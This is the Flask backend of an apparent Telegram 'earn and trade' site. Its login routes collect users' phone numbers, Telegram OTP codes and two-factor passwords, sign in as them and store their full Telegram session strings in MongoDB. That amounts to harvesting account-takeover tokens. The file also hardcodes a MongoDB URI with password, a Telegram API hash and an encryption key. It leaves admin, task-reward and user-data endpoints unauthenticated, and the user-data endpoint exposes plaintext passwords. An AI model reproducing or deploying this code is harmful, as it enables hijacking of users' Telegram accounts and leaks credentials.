import os
import base64
import asyncio
import datetime
from flask import Flask, render_template, request, jsonify, redirect, url_for
from flask_cors import CORS
from pymongo import MongoClient
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

app = Flask(__name__)
CORS(app)

# --- ১. কনফিগারেশন ও ডাটাবেস কানেকশন ---
API_ID = 36466824      
API_HASH = '535ddcb85f2c3c74cc0ff532dd2c3406'  
SECRET_KEY = b'AAF_STRONG_APP_SECURE_32_BIT_KEY' # এনক্রিপশন কি (৩২ বিট হতে হবে)

# MongoDB কানেকশন (আপনার লেটেস্ট URI ব্যবহার করা হয়েছে)
MONGO_URI = os.environ.get("MONGO_URI", "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?appName=Cluster0")
client_db = MongoClient(MONGO_URI)
db = client_db['AAF_TeleEarn'] 
users_col = db['users']
sessions_col = db['sessions']
tasks_col = db['tasks']
withdrawals_col = db['withdrawals']
ads_col = db['ads']

# ওটিপি প্রসেস করার জন্য সাময়িক মেমোরি
temp_clients = {}

# --- ২. সেশন এনক্রিপশন লজিক (Security) ---
def encrypt_session(session_str):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(session_str.encode(), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return f"{iv}:{ct}"

def decrypt_session(encrypted_str):
    try:
        iv_b64, ct_b64 = encrypted_str.split(':')
        iv = base64.b64decode(iv_b64)
        ct = base64.b64decode(ct_b64)
        cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(ct), AES.block_size).decode('utf-8')
    except:
        return encrypted_str

# --- ৩. ফ্রন্টএন্ড পেজ রুটস ---
@app.route('/')
@app.route('/dashboard')
def dashboard(): return render_template('dashboard.html')

@app.route('/wallet')
def wallet(): return render_template('wallet.html')

@app.route('/task')
def task_page(): return render_template('task.html')

@app.route('/trading')
def trading(): return render_template('trading.html')

@app.route('/account')
def account(): return render_template('account.html')

@app.route('/aaf-master-admin-control')
def admin_panel(): return render_template('admin.html')

# --- ৪. ইউজার লগইন ও টেলিগ্রাম সেশন (OTP System) ---
@app.route('/api/send_otp', methods=['POST'])
async def send_otp():
    data = request.json
    phone = data.get('phone')
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        sent_code = await client.send_code_request(phone)
        temp_clients[phone] = {'client': client, 'phone_code_hash': sent_code.phone_code_hash}
        return jsonify({"success": True, "message": "OTP Sent!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/verify_login', methods=['POST'])
async def verify_login():
    data = request.json
    phone, code, password = data.get('phone'), data.get('code'), data.get('password')
    full_name, site_pass = data.get('name'), data.get('site_password')

    if phone not in temp_clients:
        return jsonify({"success": False, "message": "Session Expired"})

    client_data = temp_clients[phone]
    client = client_data['client']
    
    try:
        try:
            await client.sign_in(phone, code, phone_code_hash=client_data['phone_code_hash'])
        except SessionPasswordNeededError:
            await client.sign_in(password=password)

        raw_session = client.session.save()
        me = await client.get_me()
        encrypted_session = encrypt_session(raw_session)

        user_doc = {
            "telegram_id": me.id, "name": full_name, "phone": phone,
            "site_password": site_pass, "main_balance": 0.0, "aaf_balance": 0.0,
            "total_trades": 0, "status": "Active", "created_at": datetime.datetime.now()
        }
        users_col.update_one({"telegram_id": me.id}, {"$set": user_doc}, upsert=True)
        sessions_col.update_one({"phone": phone}, {"$set": {"telegram_id": me.id, "session": encrypted_session}}, upsert=True)
        
        await client.disconnect()
        del temp_clients[phone]
        return jsonify({"success": True, "user_id": me.id})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

# --- ৫. ইউজার ডাটা ও উইথড্র এপিআই (৫০ টাকা ও ১০ ট্রেড লক) ---
@app.route('/api/user_data/<user_id>', methods=['GET'])
def get_user_data(user_id):
    user = users_col.find_one({"telegram_id": int(user_id)})
    if user:
        user['_id'] = str(user['_id']) # JSON Serialize
        return jsonify({"status": "success", **user})
    return jsonify({"status": "error", "message": "Not Found"}), 404

@app.route('/api/withdraw', methods=['POST'])
def handle_withdraw():
    data = request.json
    uid, amount, number = int(data.get('user_id')), float(data.get('amount', 0)), data.get('number')

    if amount < 50: return jsonify({"status": "error", "message": "Min ৳50"}), 400
    
    user = users_col.find_one({"telegram_id": uid})
    if user.get('total_trades', 0) < 10:
        return jsonify({"status": "error", "message": "Need 10 trades!"}), 403

    if user['main_balance'] >= amount:
        users_col.update_one({"telegram_id": uid}, {"$inc": {"main_balance": -amount}})
        withdrawals_col.insert_one({"user_id": uid, "amount": amount, "number": number, "status": "Pending"})
        return jsonify({"status": "success"})
    return jsonify({"status": "error", "message": "Insufficient Balance"}), 400

# --- ৬. টাস্ক ও অ্যাড কন্ট্রোল ---
@app.route('/api/complete_task', methods=['POST'])
def complete_task():
    uid, tid = request.json.get('user_id'), request.json.get('task_id')
    task = tasks_col.find_one({"task_id": tid})
    if task:
        users_col.update_one({"telegram_id": int(uid)}, {"$inc": {"main_balance": task['reward_amount']}})
        return jsonify({"status": "success"})
    return jsonify({"status": "error"})

@app.route('/api/admin/update_ads', methods=['POST'])
def update_ads():
    ads = request.json.get('ads', [])
    ads_col.update_one({}, {"$set": {"all_ads": ads}}, upsert=True)
    return jsonify({"status": "success"})

@app.route('/api/get_active_ads', methods=['GET'])
def get_ads():
    data = ads_col.find_one({})
    return jsonify({"ads": [{"code": c} for c in data.get('all_ads', [])] if data else []})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
